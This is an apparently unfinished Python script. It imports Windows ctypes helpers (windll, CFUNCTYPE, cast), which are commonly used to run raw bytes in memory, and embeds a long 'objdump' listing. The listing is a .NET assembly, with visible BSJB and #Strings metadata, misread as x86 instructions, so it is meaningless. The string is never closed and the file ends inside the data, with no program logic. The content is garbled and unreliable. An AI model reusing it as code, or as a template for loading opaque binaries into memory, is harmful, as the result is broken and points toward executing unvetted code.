#!/usr/bin/env python3
import re
import argparse
from ctypes import windll, c_char_p, c_void_p, cast, CFUNCTYPE, byref, c_uint32

# Hardcoded objdump output (Intel syntax)
OBJDUMP_OUTPUT = """
00402000 <.text>:
  402000:	77 30                	ja     0x402032
  402002:	00 00                	add    BYTE PTR [eax],al
  402004:	00 00                	add    BYTE PTR [eax],al
  402006:	00 00                	add    BYTE PTR [eax],al
  402008:	48                   	dec    eax
  402009:	00 00                	add    BYTE PTR [eax],al
  40200b:	00 02                	add    BYTE PTR [edx],al
  40200d:	00 05 00 20 23 00    	add    BYTE PTR ds:0x232000,al
  402013:	00 3c 0c             	add    BYTE PTR [esp+ecx*1],bh
  402016:	00 00                	add    BYTE PTR [eax],al
  402018:	01 00                	add    DWORD PTR [eax],eax
  40201a:	00 00                	add    BYTE PTR [eax],al
  40201c:	03 00                	add    eax,DWORD PTR [eax]
  40201e:	00 06                	add    BYTE PTR [esi],al
	...
  402050:	13 30                	adc    esi,DWORD PTR [eax]
  402052:	02 00                	add    al,BYTE PTR [eax]
  402054:	38 00                	cmp    BYTE PTR [eax],al
  402056:	00 00                	add    BYTE PTR [eax],al
  402058:	01 00                	add    DWORD PTR [eax],eax
  40205a:	00 11                	add    BYTE PTR [ecx],dl
  40205c:	73 04                	jae    0x402062
  40205e:	00 00                	add    BYTE PTR [eax],al
  402060:	06                   	push   es
  402061:	0a 06                	or     al,BYTE PTR [esi]
  402063:	28 15 00 00 0a 7d    	sub    BYTE PTR ds:0x7d0a0000,dl
  402069:	02 00                	add    al,BYTE PTR [eax]
  40206b:	00 04 06             	add    BYTE PTR [esi+eax*1],al
  40206e:	02 7d 03             	add    bh,BYTE PTR [ebp+0x3]
  402071:	00 00                	add    BYTE PTR [eax],al
  402073:	04 06                	add    al,0x6
  402075:	15 7d 01 00 00       	adc    eax,0x17d
  40207a:	04 06                	add    al,0x6
  40207c:	7c 02                	jl     0x402080
  40207e:	00 00                	add    BYTE PTR [eax],al
  402080:	04 12                	add    al,0x12
  402082:	00 28                	add    BYTE PTR [eax],ch
  402084:	01 00                	add    DWORD PTR [eax],eax
  402086:	00 2b                	add    BYTE PTR [ebx],ch
  402088:	06                   	push   es
  402089:	7c 02                	jl     0x40208d
  40208b:	00 00                	add    BYTE PTR [eax],al
  40208d:	04 28                	add    al,0x28
  40208f:	17                   	pop    ss
  402090:	00 00                	add    BYTE PTR [eax],al
  402092:	0a 2a                	or     ch,BYTE PTR [edx]
  402094:	22 02                	and    al,BYTE PTR [edx]
  402096:	28 18                	sub    BYTE PTR [eax],bl
  402098:	00 00                	add    BYTE PTR [eax],al
  40209a:	0a 00                	or     al,BYTE PTR [eax]
  40209c:	2a 00                	sub    al,BYTE PTR [eax]
  40209e:	00 00                	add    BYTE PTR [eax],al
  4020a0:	13 30                	adc    esi,DWORD PTR [eax]
  4020a2:	01 00                	add    DWORD PTR [eax],eax
  4020a4:	14 00                	adc    al,0x0
  4020a6:	00 00                	add    BYTE PTR [eax],al
  4020a8:	02 00                	add    al,BYTE PTR [eax]
  4020aa:	00 11                	add    BYTE PTR [ecx],dl
  4020ac:	02 28                	add    ch,BYTE PTR [eax]
  4020ae:	01 00                	add    DWORD PTR [eax],eax
  4020b0:	00 06                	add    BYTE PTR [esi],al
  4020b2:	6f                   	outs   dx,DWORD PTR ds:[esi]
  4020b3:	19 00                	sbb    DWORD PTR [eax],eax
  4020b5:	00 0a                	add    BYTE PTR [edx],cl
  4020b7:	0a 12                	or     dl,BYTE PTR [edx]
  4020b9:	00 28                	add    BYTE PTR [eax],ch
  4020bb:	1a 00                	sbb    al,BYTE PTR [eax]
  4020bd:	00 0a                	add    BYTE PTR [edx],cl
  4020bf:	2a 22                	sub    ah,BYTE PTR [edx]
  4020c1:	02 28                	add    ch,BYTE PTR [eax]
  4020c3:	18 00                	sbb    BYTE PTR [eax],al
  4020c5:	00 0a                	add    BYTE PTR [edx],cl
  4020c7:	00 2a                	add    BYTE PTR [edx],ch
  4020c9:	00 00                	add    BYTE PTR [eax],al
  4020cb:	00 1b                	add    BYTE PTR [ebx],bl
  4020cd:	30 03                	xor    BYTE PTR [ebx],al
  4020cf:	00 df                	add    bh,bl
  4020d1:	01 00                	add    DWORD PTR [eax],eax
  4020d3:	00 03                	add    BYTE PTR [ebx],al
  4020d5:	00 00                	add    BYTE PTR [eax],al
  4020d7:	11 02                	adc    DWORD PTR [edx],eax
  4020d9:	7b 01                	jnp    0x4020dc
  4020db:	00 00                	add    BYTE PTR [eax],al
  4020dd:	04 0a                	add    al,0xa
  4020df:	06                   	push   es
  4020e0:	2c 02                	sub    al,0x2
  4020e2:	2b 02                	sub    eax,DWORD PTR [edx]
  4020e4:	2b 17                	sub    edx,DWORD PTR [edi]
  4020e6:	00 02                	add    BYTE PTR [edx],al
  4020e8:	72 01                	jb     0x4020eb
  4020ea:	00 00                	add    BYTE PTR [eax],al
  4020ec:	70 7d                	jo     0x40216b
  4020ee:	04 00                	add    al,0x0
  4020f0:	00 04 02             	add    BYTE PTR [edx+eax*1],al
  4020f3:	73 1b                	jae    0x402110
  4020f5:	00 00                	add    BYTE PTR [eax],al
  4020f7:	0a 7d 05             	or     bh,BYTE PTR [ebp+0x5]
  4020fa:	00 00                	add    BYTE PTR [eax],al
  4020fc:	04 00                	add    al,0x0
  4020fe:	06                   	push   es
  4020ff:	2c 02                	sub    al,0x2
  402101:	2b 02                	sub    eax,DWORD PTR [edx]
  402103:	2b 48 00             	sub    ecx,DWORD PTR [eax+0x0]
  402106:	02 7b 05             	add    bh,BYTE PTR [ebx+0x5]
  402109:	00 00                	add    BYTE PTR [eax],al
  40210b:	04 02                	add    al,0x2
  40210d:	7b 04                	jnp    0x402113
  40210f:	00 00                	add    BYTE PTR [eax],al
  402111:	04 6f                	add    al,0x6f
  402113:	1c 00                	sbb    al,0x0
  402115:	00 0a                	add    BYTE PTR [edx],cl
  402117:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402118:	1d 00 00 0a 0b       	sbb    eax,0xb0a0000
  40211d:	12 01                	adc    al,BYTE PTR [ecx]
  40211f:	28 1e                	sub    BYTE PTR [esi],bl
  402121:	00 00                	add    BYTE PTR [eax],al
  402123:	0a 2d 43 02 16 25    	or     ch,BYTE PTR ds:0x25160243
  402129:	0a 7d 01             	or     bh,BYTE PTR [ebp+0x1]
  40212c:	00 00                	add    BYTE PTR [eax],al
  40212e:	04 02                	add    al,0x2
  402130:	07                   	pop    es
  402131:	7d 0c                	jge    0x40213f
  402133:	00 00                	add    BYTE PTR [eax],al
  402135:	04 02                	add    al,0x2
  402137:	0c 02                	or     al,0x2
  402139:	7c 02                	jl     0x40213d
  40213b:	00 00                	add    BYTE PTR [eax],al
  40213d:	04 12                	add    al,0x12
  40213f:	01 12                	add    DWORD PTR [edx],edx
  402141:	02 28                	add    ch,BYTE PTR [eax]
  402143:	02 00                	add    al,BYTE PTR [eax]
  402145:	00 2b                	add    BYTE PTR [ebx],ch
  402147:	00 dd                	add    ch,bl
  402149:	69 01 00 00 02 7b    	imul   eax,DWORD PTR [ecx],0x7b020000
  40214f:	0c 00                	or     al,0x0
  402151:	00 04 0b             	add    BYTE PTR [ebx+ecx*1],al
  402154:	02 7c 0c 00          	add    bh,BYTE PTR [esp+ecx*1+0x0]
  402158:	00 04 fe             	add    BYTE PTR [esi+edi*8],al
  40215b:	15 02 00 00 1b       	adc    eax,0x1b000002
  402160:	02 15 25 0a 7d 01    	add    dl,BYTE PTR ds:0x17d0a25
  402166:	00 00                	add    BYTE PTR [eax],al
  402168:	04 02                	add    al,0x2
  40216a:	12 01                	adc    al,BYTE PTR [ecx]
  40216c:	28 20                	sub    BYTE PTR [eax],ah
  40216e:	00 00                	add    BYTE PTR [eax],al
  402170:	0a 7d 07             	or     bh,BYTE PTR [ebp+0x7]
  402173:	00 00                	add    BYTE PTR [eax],al
  402175:	04 02                	add    al,0x2
  402177:	02 7b 07             	add    bh,BYTE PTR [ebx+0x7]
  40217a:	00 00                	add    BYTE PTR [eax],al
  40217c:	04 7d                	add    al,0x7d
  40217e:	06                   	push   es
  40217f:	00 00                	add    BYTE PTR [eax],al
  402181:	04 02                	add    al,0x2
  402183:	14 7d                	adc    al,0x7d
  402185:	07                   	pop    es
  402186:	00 00                	add    BYTE PTR [eax],al
  402188:	04 02                	add    al,0x2
  40218a:	28 21                	sub    BYTE PTR [ecx],ah
  40218c:	00 00                	add    BYTE PTR [eax],al
  40218e:	0a 7d 08             	or     bh,BYTE PTR [ebp+0x8]
  402191:	00 00                	add    BYTE PTR [eax],al
  402193:	04 00                	add    al,0x0
  402195:	02 7b 08             	add    bh,BYTE PTR [ebx+0x8]
  402198:	00 00                	add    BYTE PTR [eax],al
  40219a:	04 02                	add    al,0x2
  40219c:	7b 06                	jnp    0x4021a4
  40219e:	00 00                	add    BYTE PTR [eax],al
  4021a0:	04 6f                	add    al,0x6f
  4021a2:	22 00                	and    al,BYTE PTR [eax]
  4021a4:	00 0a                	add    BYTE PTR [edx],cl
  4021a6:	26 02 02             	add    al,BYTE PTR es:[edx]
  4021a9:	7b 08                	jnp    0x4021b3
  4021ab:	00 00                	add    BYTE PTR [eax],al
  4021ad:	04 6f                	add    al,0x6f
  4021af:	23 00                	and    eax,DWORD PTR [eax]
  4021b1:	00 0a                	add    BYTE PTR [edx],cl
  4021b3:	7d 09                	jge    0x4021be
  4021b5:	00 00                	add    BYTE PTR [eax],al
  4021b7:	04 00                	add    al,0x0
  4021b9:	02 02                	add    al,BYTE PTR [edx]
  4021bb:	7b 09                	jnp    0x4021c6
  4021bd:	00 00                	add    BYTE PTR [eax],al
  4021bf:	04 6f                	add    al,0x6f
  4021c1:	24 00                	and    al,0x0
  4021c3:	00 0a                	add    BYTE PTR [edx],cl
  4021c5:	7d 0a                	jge    0x4021d1
  4021c7:	00 00                	add    BYTE PTR [eax],al
  4021c9:	04 2b                	add    al,0x2b
  4021cb:	2b 02                	sub    eax,DWORD PTR [edx]
  4021cd:	02 7b 0a             	add    bh,BYTE PTR [ebx+0xa]
  4021d0:	00 00                	add    BYTE PTR [eax],al
  4021d2:	04 6f                	add    al,0x6f
  4021d4:	25 00 00 0a 7d       	and    eax,0x7d0a0000
  4021d9:	0b 00                	or     eax,DWORD PTR [eax]
  4021db:	00 04 00             	add    BYTE PTR [eax+eax*1],al
  4021de:	02 7b 0b             	add    bh,BYTE PTR [ebx+0xb]
  4021e1:	00 00                	add    BYTE PTR [eax],al
  4021e3:	04 6f                	add    al,0x6f
  4021e5:	26 00 00             	add    BYTE PTR es:[eax],al
  4021e8:	0a 28                	or     ch,BYTE PTR [eax]
  4021ea:	27                   	daa    
  4021eb:	00 00                	add    BYTE PTR [eax],al
  4021ed:	0a 00                	or     al,BYTE PTR [eax]
  4021ef:	00 02                	add    BYTE PTR [edx],al
  4021f1:	14 7d                	adc    al,0x7d
  4021f3:	0b 00                	or     eax,DWORD PTR [eax]
  4021f5:	00 04 02             	add    BYTE PTR [edx+eax*1],al
  4021f8:	7b 0a                	jnp    0x402204
  4021fa:	00 00                	add    BYTE PTR [eax],al
  4021fc:	04 6f                	add    al,0x6f
  4021fe:	28 00                	sub    BYTE PTR [eax],al
  402200:	00 0a                	add    BYTE PTR [edx],cl
  402202:	2d c8 de 19 06       	sub    eax,0x619dec8
  402207:	16                   	push   ss
  402208:	2f                   	das    
  402209:	14 02                	adc    al,0x2
  40220b:	7b 0a                	jnp    0x402217
  40220d:	00 00                	add    BYTE PTR [eax],al
  40220f:	04 2c                	add    al,0x2c
  402211:	0c 02                	or     al,0x2
  402213:	7b 0a                	jnp    0x40221f
  402215:	00 00                	add    BYTE PTR [eax],al
  402217:	04 6f                	add    al,0x6f
  402219:	29 00                	sub    DWORD PTR [eax],eax
  40221b:	00 0a                	add    BYTE PTR [edx],cl
  40221d:	00 dc                	add    ah,bl
  40221f:	02 14 7d 0a 00 00 04 	add    dl,BYTE PTR [edi*2+0x400000a]
  402226:	00 02                	add    BYTE PTR [edx],al
  402228:	14 7d                	adc    al,0x7d
  40222a:	09 00                	or     DWORD PTR [eax],eax
  40222c:	00 04 de             	add    BYTE PTR [esi+ebx*8],al
  40222f:	19 06                	sbb    DWORD PTR [esi],eax
  402231:	16                   	push   ss
  402232:	2f                   	das    
  402233:	14 02                	adc    al,0x2
  402235:	7b 08                	jnp    0x40223f
  402237:	00 00                	add    BYTE PTR [eax],al
  402239:	04 2c                	add    al,0x2c
  40223b:	0c 02                	or     al,0x2
  40223d:	7b 08                	jnp    0x402247
  40223f:	00 00                	add    BYTE PTR [eax],al
  402241:	04 6f                	add    al,0x6f
  402243:	29 00                	sub    DWORD PTR [eax],eax
  402245:	00 0a                	add    BYTE PTR [edx],cl
  402247:	00 dc                	add    ah,bl
  402249:	02 14 7d 08 00 00 04 	add    dl,BYTE PTR [edi*2+0x4000008]
  402250:	00 02                	add    BYTE PTR [edx],al
  402252:	14 7d                	adc    al,0x7d
  402254:	06                   	push   es
  402255:	00 00                	add    BYTE PTR [eax],al
  402257:	04 de                	add    al,0xde
  402259:	19 06                	sbb    DWORD PTR [esi],eax
  40225b:	16                   	push   ss
  40225c:	2f                   	das    
  40225d:	14 02                	adc    al,0x2
  40225f:	7b 05                	jnp    0x402266
  402261:	00 00                	add    BYTE PTR [eax],al
  402263:	04 2c                	add    al,0x2c
  402265:	0c 02                	or     al,0x2
  402267:	7b 05                	jnp    0x40226e
  402269:	00 00                	add    BYTE PTR [eax],al
  40226b:	04 6f                	add    al,0x6f
  40226d:	29 00                	sub    DWORD PTR [eax],eax
  40226f:	00 0a                	add    BYTE PTR [edx],cl
  402271:	00 dc                	add    ah,bl
  402273:	02 14 7d 05 00 00 04 	add    dl,BYTE PTR [edi*2+0x4000005]
  40227a:	de 1f                	ficomp WORD PTR [edi]
  40227c:	0d 02 1f fe 7d       	or     eax,0x7dfe1f02
  402281:	01 00                	add    DWORD PTR [eax],eax
  402283:	00 04 02             	add    BYTE PTR [edx+eax*1],al
  402286:	14 7d                	adc    al,0x7d
  402288:	04 00                	add    al,0x0
  40228a:	00 04 02             	add    BYTE PTR [edx+eax*1],al
  40228d:	7c 02                	jl     0x402291
  40228f:	00 00                	add    BYTE PTR [eax],al
  402291:	04 09                	add    al,0x9
  402293:	28 2a                	sub    BYTE PTR [edx],ch
  402295:	00 00                	add    BYTE PTR [eax],al
  402297:	0a 00                	or     al,BYTE PTR [eax]
  402299:	de 1b                	ficomp WORD PTR [ebx]
  40229b:	02 1f                	add    bl,BYTE PTR [edi]
  40229d:	fe                   	(bad)  
  40229e:	7d 01                	jge    0x4022a1
  4022a0:	00 00                	add    BYTE PTR [eax],al
  4022a2:	04 02                	add    al,0x2
  4022a4:	14 7d                	adc    al,0x7d
  4022a6:	04 00                	add    al,0x0
  4022a8:	00 04 02             	add    BYTE PTR [edx+eax*1],al
  4022ab:	7c 02                	jl     0x4022af
  4022ad:	00 00                	add    BYTE PTR [eax],al
  4022af:	04 28                	add    al,0x28
  4022b1:	2b 00                	sub    eax,DWORD PTR [eax]
  4022b3:	00 0a                	add    BYTE PTR [edx],cl
  4022b5:	00 2a                	add    BYTE PTR [edx],ch
  4022b7:	00 41 64             	add    BYTE PTR [ecx+0x64],al
  4022ba:	00 00                	add    BYTE PTR [eax],al
  4022bc:	02 00                	add    al,BYTE PTR [eax]
  4022be:	00 00                	add    BYTE PTR [eax],al
  4022c0:	f2 00 00             	repnz add BYTE PTR [eax],al
  4022c3:	00 3c 00             	add    BYTE PTR [eax+eax*1],bh
  4022c6:	00 00                	add    BYTE PTR [eax],al
  4022c8:	2e 01 00             	add    DWORD PTR cs:[eax],eax
  4022cb:	00 19                	add    BYTE PTR [ecx],bl
  4022cd:	00 00                	add    BYTE PTR [eax],al
  4022cf:	00 00                	add    BYTE PTR [eax],al
  4022d1:	00 00                	add    BYTE PTR [eax],al
  4022d3:	00 02                	add    BYTE PTR [edx],al
  4022d5:	00 00                	add    BYTE PTR [eax],al
  4022d7:	00 bc 00 00 00 9c 00 	add    BYTE PTR [eax+eax*1+0x9c0000],bh
  4022de:	00 00                	add    BYTE PTR [eax],al
  4022e0:	58                   	pop    eax
  4022e1:	01 00                	add    DWORD PTR [eax],eax
  4022e3:	00 19                	add    BYTE PTR [ecx],bl
  4022e5:	00 00                	add    BYTE PTR [eax],al
  4022e7:	00 00                	add    BYTE PTR [eax],al
  4022e9:	00 00                	add    BYTE PTR [eax],al
  4022eb:	00 02                	add    BYTE PTR [edx],al
  4022ed:	00 00                	add    BYTE PTR [eax],al
  4022ef:	00 26                	add    BYTE PTR [esi],ah
  4022f1:	00 00                	add    BYTE PTR [eax],al
  4022f3:	00 5c 01 00          	add    BYTE PTR [ecx+eax*1+0x0],bl
  4022f7:	00 82 01 00 00 19    	add    BYTE PTR [edx+0x19000001],al
	...
  402305:	00 00                	add    BYTE PTR [eax],al
  402307:	00 07                	add    BYTE PTR [edi],al
  402309:	00 00                	add    BYTE PTR [eax],al
  40230b:	00 9d 01 00 00 a4    	add    BYTE PTR [ebp-0x5bffffff],bl
  402311:	01 00                	add    DWORD PTR [eax],eax
  402313:	00 1f                	add    BYTE PTR [edi],bl
  402315:	00 00                	add    BYTE PTR [eax],al
  402317:	00 18                	add    BYTE PTR [eax],bl
  402319:	00 00                	add    BYTE PTR [eax],al
  40231b:	01 06                	add    DWORD PTR [esi],eax
  40231d:	2a 00                	sub    al,BYTE PTR [eax]
  40231f:	00 42 53             	add    BYTE PTR [edx+0x53],al
  402322:	4a                   	dec    edx
  402323:	42                   	inc    edx
  402324:	01 00                	add    DWORD PTR [eax],eax
  402326:	01 00                	add    DWORD PTR [eax],eax
  402328:	00 00                	add    BYTE PTR [eax],al
  40232a:	00 00                	add    BYTE PTR [eax],al
  40232c:	0c 00                	or     al,0x0
  40232e:	00 00                	add    BYTE PTR [eax],al
  402330:	76 34                	jbe    0x402366
  402332:	2e 30 2e             	xor    BYTE PTR cs:[esi],ch
  402335:	33 30                	xor    esi,DWORD PTR [eax]
  402337:	33 31                	xor    esi,DWORD PTR [ecx]
  402339:	39 00                	cmp    DWORD PTR [eax],eax
  40233b:	00 00                	add    BYTE PTR [eax],al
  40233d:	00 05 00 6c 00 00    	add    BYTE PTR ds:0x6c00,al
  402343:	00 20                	add    BYTE PTR [eax],ah
  402345:	04 00                	add    al,0x0
  402347:	00 23                	add    BYTE PTR [ebx],ah
  402349:	7e 00                	jle    0x40234b
  40234b:	00 8c 04 00 00 48 05 	add    BYTE PTR [esp+eax*1+0x5480000],cl
  402352:	00 00                	add    BYTE PTR [eax],al
  402354:	23 53 74             	and    edx,DWORD PTR [ebx+0x74]
  402357:	72 69                	jb     0x4023c2
  402359:	6e                   	outs   dx,BYTE PTR ds:[esi]
  40235a:	67 73 00             	addr16 jae 0x40235d
  40235d:	00 00                	add    BYTE PTR [eax],al
  40235f:	00 d4                	add    ah,dl
  402361:	09 00                	or     DWORD PTR [eax],eax
  402363:	00 50 00             	add    BYTE PTR [eax+0x0],dl
  402366:	00 00                	add    BYTE PTR [eax],al
  402368:	23 55 53             	and    edx,DWORD PTR [ebp+0x53]
  40236b:	00 24 0a             	add    BYTE PTR [edx+ecx*1],ah
  40236e:	00 00                	add    BYTE PTR [eax],al
  402370:	10 00                	adc    BYTE PTR [eax],al
  402372:	00 00                	add    BYTE PTR [eax],al
  402374:	23 47 55             	and    eax,DWORD PTR [edi+0x55]
  402377:	49                   	dec    ecx
  402378:	44                   	inc    esp
  402379:	00 00                	add    BYTE PTR [eax],al
  40237b:	00 34 0a             	add    BYTE PTR [edx+ecx*1],dh
  40237e:	00 00                	add    BYTE PTR [eax],al
  402380:	08 02                	or     BYTE PTR [edx],al
  402382:	00 00                	add    BYTE PTR [eax],al
  402384:	23 42 6c             	and    eax,DWORD PTR [edx+0x6c]
  402387:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402388:	62 00                	bound  eax,QWORD PTR [eax]
  40238a:	00 00                	add    BYTE PTR [eax],al
  40238c:	00 00                	add    BYTE PTR [eax],al
  40238e:	00 00                	add    BYTE PTR [eax],al
  402390:	02 00                	add    al,BYTE PTR [eax]
  402392:	00 01                	add    BYTE PTR [ecx],al
  402394:	57                   	push   edi
  402395:	17                   	pop    ss
  402396:	02 0a                	add    cl,BYTE PTR [edx]
  402398:	09 0a                	or     DWORD PTR [edx],ecx
  40239a:	00 00                	add    BYTE PTR [eax],al
  40239c:	00 fa                	add    dl,bh
  40239e:	01 33                	add    DWORD PTR [ebx],esi
  4023a0:	00 16                	add    BYTE PTR [esi],dl
  4023a2:	00 00                	add    BYTE PTR [eax],al
  4023a4:	01 00                	add    DWORD PTR [eax],eax
  4023a6:	00 00                	add    BYTE PTR [eax],al
  4023a8:	23 00                	and    eax,DWORD PTR [eax]
  4023aa:	00 00                	add    BYTE PTR [eax],al
  4023ac:	03 00                	add    eax,DWORD PTR [eax]
  4023ae:	00 00                	add    BYTE PTR [eax],al
  4023b0:	0c 00                	or     al,0x0
  4023b2:	00 00                	add    BYTE PTR [eax],al
  4023b4:	06                   	push   es
  4023b5:	00 00                	add    BYTE PTR [eax],al
  4023b7:	00 03                	add    BYTE PTR [ebx],al
  4023b9:	00 00                	add    BYTE PTR [eax],al
  4023bb:	00 01                	add    BYTE PTR [ecx],al
  4023bd:	00 00                	add    BYTE PTR [eax],al
  4023bf:	00 2b                	add    BYTE PTR [ebx],ch
  4023c1:	00 00                	add    BYTE PTR [eax],al
  4023c3:	00 15 00 00 00 03    	add    BYTE PTR ds:0x3000000,dl
  4023c9:	00 00                	add    BYTE PTR [eax],al
  4023cb:	00 02                	add    BYTE PTR [edx],al
  4023cd:	00 00                	add    BYTE PTR [eax],al
  4023cf:	00 04 00             	add    BYTE PTR [eax+eax*1],al
  4023d2:	00 00                	add    BYTE PTR [eax],al
  4023d4:	01 00                	add    DWORD PTR [eax],eax
  4023d6:	00 00                	add    BYTE PTR [eax],al
  4023d8:	04 00                	add    al,0x0
  4023da:	00 00                	add    BYTE PTR [eax],al
  4023dc:	01 00                	add    DWORD PTR [eax],eax
  4023de:	00 00                	add    BYTE PTR [eax],al
  4023e0:	02 00                	add    al,BYTE PTR [eax]
  4023e2:	00 00                	add    BYTE PTR [eax],al
  4023e4:	00 00                	add    BYTE PTR [eax],al
  4023e6:	9b                   	fwait
  4023e7:	03 01                	add    eax,DWORD PTR [ecx]
  4023e9:	00 00                	add    BYTE PTR [eax],al
  4023eb:	00 00                	add    BYTE PTR [eax],al
  4023ed:	00 06                	add    BYTE PTR [esi],al
  4023ef:	00 c7                	add    bh,al
  4023f1:	02 9c 04 06 00 32 03 	add    bl,BYTE PTR [esp+eax*1+0x3320006]
  4023f8:	9c                   	pushf  
  4023f9:	04 06                	add    al,0x6
  4023fb:	00 a7 01 89 04 0f    	add    BYTE PTR [edi+0xf048901],ah
  402401:	00 bc 04 00 00 06 00 	add    BYTE PTR [esp+eax*1+0x60000],bh
  402408:	1c 02                	sbb    al,0x2
  40240a:	50                   	push   eax
  40240b:	03 06                	add    eax,DWORD PTR [esi]
  40240d:	00 19                	add    BYTE PTR [ecx],bl
  40240f:	03 ed                	add    ebp,ebp
  402411:	03 06                	add    eax,DWORD PTR [esi]
  402413:	00 90 02 ed 03 06    	add    BYTE PTR [eax+0x603ed02],dl
  402419:	00 4d 02             	add    BYTE PTR [ebp+0x2],cl
  40241c:	ed                   	in     eax,dx
  40241d:	03 06                	add    eax,DWORD PTR [esi]
  40241f:	00 6a 02             	add    BYTE PTR [edx+0x2],ch
  402422:	ed                   	in     eax,dx
  402423:	03 06                	add    eax,DWORD PTR [esi]
  402425:	00 e7                	add    bh,ah
  402427:	02 ed                	add    ch,ch
  402429:	03 06                	add    eax,DWORD PTR [esi]
  40242b:	00 cd                	add    ch,cl
  40242d:	01 ed                	add    ebp,ebp
  40242f:	03 06                	add    eax,DWORD PTR [esi]
  402431:	00 af 02 9c 04 06    	add    BYTE PTR [edi+0x6049c02],ch
  402437:	00 fc                	add    ah,bh
  402439:	04 c4                	add    al,0xc4
  40243b:	03 06                	add    eax,DWORD PTR [esi]
  40243d:	00 00                	add    BYTE PTR [eax],al
  40243f:	03 9c 04 06 00 6d 01 	add    ebx,DWORD PTR [esp+eax*1+0x16d0006]
  402446:	c4 03                	les    eax,FWORD PTR [ebx]
  402448:	06                   	push   es
  402449:	00 e4                	add    ah,ah
  40244b:	01 9c 04 06 00 ff 01 	add    DWORD PTR [esp+eax*1+0x1ff0006],ebx
  402452:	89 04 06             	mov    DWORD PTR [esi+eax*1],eax
  402455:	00 77 03             	add    BYTE PTR [edi+0x3],dh
  402458:	d0 04 06             	rol    BYTE PTR [esi+eax*1],1
  40245b:	00 bb 01 9c 04 06    	add    BYTE PTR [ebx+0x6049c01],bh
  402461:	00 52 04             	add    BYTE PTR [edx+0x4],dl
  402464:	9c                   	pushf  
  402465:	04 06                	add    al,0x6
  402467:	00 8c 01 9c 04 06 00 	add    BYTE PTR [ecx+eax*1+0x6049c],cl
  40246e:	3d 01 9c 04 06       	cmp    eax,0x6049c01
  402473:	00 37                	add    BYTE PTR [edi],dh
  402475:	00 9c 04 06 00 02 04 	add    BYTE PTR [esp+eax*1+0x4020006],bl
  40247c:	c4 03                	les    eax,FWORD PTR [ebx]
  40247e:	06                   	push   es
  40247f:	00 1c 04             	add    BYTE PTR [esp+eax*1],bl
  402482:	9c                   	pushf  
  402483:	04 0a                	add    al,0xa
  402485:	00 17                	add    BYTE PTR [edi],dl
  402487:	05 0c 04 0e 00       	add    eax,0xe040c
  40248c:	b1 03                	mov    cl,0x3
  40248e:	d0 03                	rol    BYTE PTR [ebx],1
  402490:	06                   	push   es
  402491:	00 2a                	add    BYTE PTR [edx],ch
  402493:	00 7c 03 0e          	add    BYTE PTR [ebx+eax*1+0xe],bh
  402497:	00 fa                	add    dl,bh
  402499:	04 d0                	add    al,0xd0
  40249b:	03 06                	add    eax,DWORD PTR [esi]
  40249d:	00 45 00             	add    BYTE PTR [ebp+0x0],al
  4024a0:	b1 00                	mov    cl,0x0
  4024a2:	06                   	push   es
  4024a3:	00 35 02 89 04 06    	add    BYTE PTR ds:0x6048902,dh
  4024a9:	00 23                	add    BYTE PTR [ebx],ah
  4024ab:	00 d0                	add    al,dl
  4024ad:	04 12                	add    al,0x12
  4024af:	00 1c 01             	add    BYTE PTR [ecx+eax*1],bl
  4024b2:	c4 03                	les    eax,FWORD PTR [ebx]
  4024b4:	06                   	push   es
  4024b5:	00 69 04             	add    BYTE PTR [ecx+0x4],ch
  4024b8:	e7 04                	out    0x4,eax
  4024ba:	06                   	push   es
  4024bb:	00 09                	add    BYTE PTR [ecx],cl
  4024bd:	01 c4                	add    esp,eax
  4024bf:	03 00                	add    eax,DWORD PTR [eax]
  4024c1:	00 00                	add    BYTE PTR [eax],al
  4024c3:	00 a1 00 00 00 00    	add    BYTE PTR [ecx+0x0],ah
  4024c9:	00 01                	add    BYTE PTR [ecx],al
  4024cb:	00 01                	add    BYTE PTR [ecx],al
  4024cd:	00 00                	add    BYTE PTR [eax],al
  4024cf:	00 10                	add    BYTE PTR [eax],dl
  4024d1:	00 bc 03 00 00 35 00 	add    BYTE PTR [ebx+eax*1+0x350000],bh
  4024d8:	01 00                	add    DWORD PTR [eax],eax
  4024da:	01 00                	add    DWORD PTR [eax],eax
  4024dc:	03 01                	add    eax,DWORD PTR [ecx]
  4024de:	10 00                	adc    BYTE PTR [eax],al
  4024e0:	01 00                	add    DWORD PTR [eax],eax
  4024e2:	00 00                	add    BYTE PTR [eax],al
  4024e4:	35 00 01 00 04       	xor    eax,0x4000100
  4024e9:	00 06                	add    BYTE PTR [esi],al
  4024eb:	00 81 01 e9 00 06    	add    BYTE PTR [ecx+0x600e901],al
  4024f1:	00 33                	add    BYTE PTR [ebx],dh
  4024f3:	04 ec                	add    al,0xec
  4024f5:	00 06                	add    BYTE PTR [esi],al
  4024f7:	00 cb                	add    bl,cl
  4024f9:	04 f0                	add    al,0xf0
  4024fb:	00 01                	add    BYTE PTR [ecx],al
  4024fd:	00 0c 00             	add    BYTE PTR [eax+eax*1],cl
  402500:	f4                   	hlt    
  402501:	00 01                	add    BYTE PTR [ecx],al
  402503:	00 53 00             	add    BYTE PTR [ebx+0x0],dl
  402506:	f7 00 01 00 60 00    	test   DWORD PTR [eax],0x600001
  40250c:	f4                   	hlt    
  40250d:	00 01                	add    BYTE PTR [ecx],al
  40250f:	00 6f 00             	add    BYTE PTR [edi+0x0],ch
  402512:	f4                   	hlt    
  402513:	00 01                	add    BYTE PTR [ecx],al
  402515:	00 76 00             	add    BYTE PTR [esi+0x0],dh
  402518:	fb                   	sti    
  402519:	00 01                	add    BYTE PTR [ecx],al
  40251b:	00 7f 00             	add    BYTE PTR [edi+0x0],bh
  40251e:	ff 00                	inc    DWORD PTR [eax]
  402520:	01 00                	add    DWORD PTR [eax],eax
  402522:	8d 00                	lea    eax,[eax]
  402524:	07                   	pop    es
  402525:	01 01                	add    DWORD PTR [ecx],eax
  402527:	00 94 00 0f 01 01 00 	add    BYTE PTR [eax+eax*1+0x1010f],dl
  40252e:	1c 00                	sbb    al,0x0
  402530:	13 01                	adc    eax,DWORD PTR [ecx]
  402532:	50                   	push   eax
  402533:	20 00                	and    BYTE PTR [eax],al
  402535:	00 00                	add    BYTE PTR [eax],al
  402537:	00 91 00 cb 03 1a    	add    BYTE PTR [ecx+0x1a03cb00],dl
  40253d:	01 01                	add    DWORD PTR [ecx],eax
  40253f:	00 94 20 00 00 00 00 	add    BYTE PTR [eax+eiz*1+0x0],dl
  402546:	86 18                	xchg   BYTE PTR [eax],bl
  402548:	83 04 06 00          	add    DWORD PTR [esi+eax*1],0x0
